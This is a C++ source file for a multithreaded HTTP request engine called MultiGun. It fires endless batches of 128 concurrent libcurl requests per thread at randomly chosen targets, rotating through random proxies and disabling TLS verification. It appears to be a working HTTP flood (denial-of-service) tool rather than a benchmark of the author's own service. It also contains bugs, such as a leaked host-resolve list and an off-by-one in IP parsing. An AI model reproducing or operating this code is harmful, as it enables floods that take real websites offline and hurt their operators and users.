#include "multigun.h"

#include "gun.h"

MultiGun::MultiGun(Jobs * jobs, Proxy * prx, Stats *stat)
{

    this->jobs = jobs;
    this->prx  = prx;
    this->stat = stat;

    this->watcherTh = new std::thread(&MultiGun::watcher,this);

}

void MultiGun::fire() {
    threads.clear();
    thState.clear();
    for (uint i = 0;i < threadsCount; i++) {
        auto th = new std::thread(&MultiGun::httpGet,this,i);
        threads.push_back(th);
        std::cout << "starting threads:" << i << std::endl;
        
    }
    startTime = time(nullptr);

}


void MultiGun::watcher() {
    size_t i = 1; // init load in main.cpp
    while (true) {
        if (i == 17) {
            prx->loadUrl(); // load last succesed
        }

        if (i == 15) {
            jobs->load();
        }
        i++;
        if (i == 61) {
            i = 1;
        }
        std::this_thread::sleep_for(std::chrono::minutes(1));

    }
}



size_t WriteCallbackM(void *contents, size_t size, size_t nmemb, void *userp)
{
    return size * nmemb;
    //((std::string*)userp)->append((char*)contents, size * nmemb);
    //return size * nmemb;
}

void MultiGun::httpGet(uint thId) {
    std::this_thread::sleep_for(std::chrono::milliseconds(500 + (rand() % 1500)));
    const int hNum = 128;
    CURL  * handles[hNum];
    CURLM * multi_handle;
    int runningCount = 1;

    std::vector<struct curl_slist *> hostResolves; // need clean up after
    // for stat
    std::vector<std::string> targets;
    std::vector<std::string> prxS;
    //for stat--
    while (true) {
        runningCount = 1;
        for (int i=0;i<hNum;i++) {

            handles[i] = curl_easy_init();
            auto curl = handles[i];

            std::string readBuffer;

            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallbackM);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
            curl_easy_setopt(curl, CURLOPT_TIMEOUT, 15L);
            curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 15L);
            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0);
            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0);

            std::string randPrx;
            Job * job;

            thState[thId].state = "req";
            thState[thId].count++;

            randPrx = prx->getRand();
            if (randPrx != "") {
                curl_easy_setopt(curl, CURLOPT_PROXY, randPrx.c_str());
            }
            prxS.push_back(randPrx);

            job = jobs->getRand();
            //thState[thId].target = job->getTarget();

            targets.push_back(job->getTarget());

            curl_easy_setopt(curl, CURLOPT_URL, job->path.c_str());
            if (job->staticHost != "") {
                std::string s;
                std::string ip   = job->staticHost.substr (0,job->staticHost.find(":")-1);
                std::string port = job->staticHost.substr (job->staticHost.find(":")+1);
                s = job->getHost() + ":" + port + ":" + ip;
                struct curl_slist *hostResolve = nullptr;
                hostResolves.push_back(hostResolve);
                hostResolve = curl_slist_append(NULL,s.c_str());
                curl_easy_setopt(curl, CURLOPT_RESOLVE, hostResolve);
            }
        }

        multi_handle = curl_multi_init();
        for(int i = 0; i<hNum; i++) {
            curl_multi_add_handle(multi_handle, handles[i]);
        }

        while (runningCount) {
            CURLMcode mc = curl_multi_perform(multi_handle, &runningCount);
            if (runningCount) {
                 mc = curl_multi_poll(multi_handle, NULL, 0, 1000, NULL);
            }
            if (mc == CURLM_OK) {
                std::this_thread::sleep_for(std::chrono::seconds(1));
            }
            if (mc != CURLM_OK) {
                std::cout << "CURL multi not OK: " << mc << std::endl;
                break;// something wrong
            }
            thState[thId].target = "requests running " + std::to_string(runningCount) + " of " +std::to_string(hNum);
            //std::cout << "Running " << runningCount << std::endl;
        }

        CURLMsg *msg; /* for picking up messages with the transfer status */
        int msgs_left; /* how many messages are left */
        while ((msg = curl_multi_info_read(multi_handle, &msgs_left))) {
            if (msg->msg == CURLMSG_DONE) {
                int i = 0;
                for(i = 0; i < hNum; i ++) {
                    if (msg->easy_handle == handles[i]) {
                        break;
                    }
                }
                long http_code = 0;
                // CURLINFO_PROXY_ERROR
                curl_easy_getinfo (handles[i], CURLINFO_RESPONSE_CODE, &http_code);
                auto res = msg->data.result;
                this->stat->push(targets.at(i), prxS.at(i),res,http_code);
            }
          }

        for(int i = 0; i<hNum; i++) {
            curl_multi_remove_handle(multi_handle, handles[i]);
            curl_easy_cleanup(handles[i]);
        }
        curl_multi_cleanup(multi_handle);
        prxS.clear();
        targets.clear();
        for (auto slist:hostResolves) {
            curl_slist_free_all(slist);
        }
        hostResolves.clear();
        //std::cout << "Clean up, next" << std::endl;
    }




}
